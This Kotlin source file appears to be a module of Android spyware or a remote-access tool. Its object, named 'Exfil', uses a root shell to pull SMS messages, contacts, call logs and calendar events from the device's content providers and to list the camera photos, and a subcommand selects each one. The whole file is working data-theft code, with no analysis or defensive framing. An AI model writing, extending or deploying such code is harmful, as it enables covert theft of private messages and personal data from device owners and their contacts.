package ai.obsidian.agent.cmd

import ai.obsidian.agent.root.Shell
import android.content.Context

object Exfil {

    fun run(context: Context, sub: String): String = when (sub) {
        "sms" -> Shell.run(
            context,
            "content query --uri content://sms --projection address:body:date | head -200"
        )
        "contacts" -> Shell.run(
            context,
            "content query --uri content://com.android.contacts/data/phones " +
                "--projection display_name:data1 | head -300"
        )
        "calllog" -> Shell.run(
            context,
            "content query --uri content://call_log/calls --projection number:duration:date | head -200"
        )
        "calendar" -> Shell.run(
            context,
            "content query --uri content://com.android.calendar/events --projection title:dtstart | head -200"
        )
        "photos" -> Shell.run(context, "ls -la /sdcard/DCIM/Camera | tail -50")
        else -> "exfil sms|contacts|calllog|calendar|photos"
    }
}
